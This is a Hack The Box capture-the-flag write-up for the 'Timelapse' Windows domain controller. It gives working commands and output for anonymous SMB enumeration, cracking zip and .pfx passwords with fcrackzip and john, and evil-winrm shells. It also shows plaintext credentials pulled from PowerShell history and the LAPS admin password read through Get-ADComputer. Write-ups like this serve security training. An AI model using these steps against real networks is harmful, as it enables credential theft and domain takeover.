---
title: Hack The Box - Timelapse
date: 2023-01-28
categories: [hackthebox]
tags: [windows,active directory,smbclient,LAPS,openssl,john,pfx2john,powerShell history file,easy]
math: true
mermaid: true
toc: true
comments: true
---

<img src="/assets/Hackthebox/Timelapse/0.png" width="100%" height="90%">

## RECON

### NMAP

`Nmap` shows multiple ports open. Since `ldap, kerberos, DNS and SMB` ports are open it's probably a `Domain Controller`.
Nmap script shows that the domain name is `timelapse.htb`

```bash
$nmap -Pn -p- --min-rate 10000 10.10.11.152 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 09:24 +0545
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.077s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown
49701/tcp open  unknown

$nmap -Pn -p53,88,135,139,445,464,593,636,3268,3269,5986,9389,49673,49674,49692,49701 -sC -sV 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 09:27 +0545
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.076s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-01-28 11:41:57Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_ssl-date: 2023-01-28T11:43:27+00:00; +7h59m20s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
49701/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m19s, deviation: 0s, median: 7h59m19s
| smb2-time:
|   date: 2023-01-28T11:42:49
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.26 seconds
```
### SMB - PORT 445

### SMBCLIENT

Using `smbclinet` to list shares using `Null Authentication`. The shares `ADMIN$` `C$` and `IPC$` are default on all windows system . `NETLOGON` and `SYSVOL` are standard for any domain controller (DC). `Shares` seems to be the intresting one here.

```bash
smbclient -L //10.10.11.152 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

There's two directories `Dev` and `HelpDesk`.
```bash
smbclient -N //10.10.11.152/shares 

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 21:24:15 2021
  ..                                  D        0  Mon Oct 25 21:24:15 2021
  Dev                                 D        0  Tue Oct 26 01:25:06 2021
  HelpDesk                            D        0  Mon Oct 25 21:33:42 2021
```
`Dev` has a `winrm_backup.zip` file, we will download it to our machine and `HelpDesk` hash some files regarding `LAPS`.
```bash
smb: \Dev\> dir
  .                                   D        0  Tue Oct 26 01:25:06 2021
  ..                                  D        0  Tue Oct 26 01:25:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 21:31:42 2021

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (8.1 KiloBytes/sec) (average 8.1 KiloBytes/sec)

smb: \> cd HelpDesk
smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 21:33:42 2021
  ..                                  D        0  Mon Oct 25 21:33:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 20:42:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 20:42:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 20:42:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 20:42:44 2021
```

### ABOUT LAPS

```
The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.
```


### ZIP FILE CRACKING

While trying to unzip the `winrm_backup.zip` file it turns out to be password protected so we will use `fcrackzip` utility to crack the zip file password using `rockyou.txt` wordlist.
```bash
$unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
   skipping: legacyy_dev_auth.pfx    incorrect password

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip


PASSWORD FOUND!!!!: pw == supremelegacy
```
We found the password as `supremelegacy`. we will now unzip using this password.
```bash
unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

Theres a file `legacyy_dev_auth.pfx` in the zip archive.

### ABOUT PFX FILE EXTENSION
```
A .pfx file is a digital certificate file that is used to authenticate a user or device. It contains the private key and public key for the certificate, as well as any intermediate certificates that are required for trust. PFX files are typically used for secure web connections, email signing and encryption, and other secure communications

```

Using `openssl` to extract the key and certificate from the `.pfx` file, it appears to require a password. 
```bash
$openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key -nodes
Enter Import Password:
```

### PFX2JOHN

`pfx2john.py` will generate hash for this, and we can use `john` to crack the hash.
```bash
$sudo python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.hash
```

### JOHN
```bash
$john pfx.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:49 DONE (2023-01-26 23:00) 0.02010g/s 64972p/s 64972c/s 64972C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed

 $john --show pfx.hash 
legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx 

1 password hash cracked, 0 left
```

### EXTRACTING KEYS

Using `thuglegacy` as password we can now extract `key` and `cert`.
```
$openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key -nodes 
Enter Import Password:

$openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
```

```
$cat legacyy_dev_auth.key
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLz
TSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3to
pwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsb
oRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3
dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2
qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzD
MEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzW
fAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9j
PJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnL
GNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0
Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmU
Ifvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ
7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7
tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ
2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja
8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV
1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegI
ZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7o
btTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN
71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3
QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b0
6jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK
/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/r
c2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+X
TTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8
A5ZZvI+GsHhm0Oab7PEWlRY=
-----END PRIVATE KEY-----

$cat legacyy_dev_auth.crt
Bag Attributes
    localKeyID: 01 00 00 00
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
-----END CERTIFICATE-----
```


## SHELL AS LEGACY

we can now use `evil-winrm` to spawn a shell using above cert and key. Since nmap shows `port 5986` open , we need to use -S for the `SSL` connection.
```
$evil-winrm -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -i 10.10.11.152

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

## SHELL AS SVC_DEPLOY

### ENUMERATION

```
*Evil-WinRM* PS C:\Users\legacyy> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/28/2023 4:18:04 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.
```

No interesting privileges here.
```
*Evil-WinRM* PS C:\Users\legacyy> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### POWERSHELL HISTORY

Found a new user `svc_deploy`  and it's credential `E3R$Q62^12p7PLlC%KWaxuaV` 

```
*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
we are now logged in as `svc_deploy`
```
$evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```


## SHELL AS ROOT

### ENUMERATION

`svc_deploy` user is a member of `LAPS_Readers` and has access to read from `LAPS`.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/28/2023 3:28:06 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

No interesting privileges for `svc_deploy` user as well.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

READ PASSWORD

To read the LAPS password, we need to use `Get-ADComputer` and request the `ms-mcs-admpwd` property.

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : HQ[s0h+717F6CR.)b+7)mm4a
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```
Using evil-winrm to get `administrator` shell. 
```
$evil-winrm -i timelapse.htb -S -u administrator -p "HQ[s0h+717F6CR.)b+7)mm4a"

Evil-WinRM shell v3.4

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

### Reference:
```
https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file

https://www.hackingarticles.in/credential-dumpinglaps/
```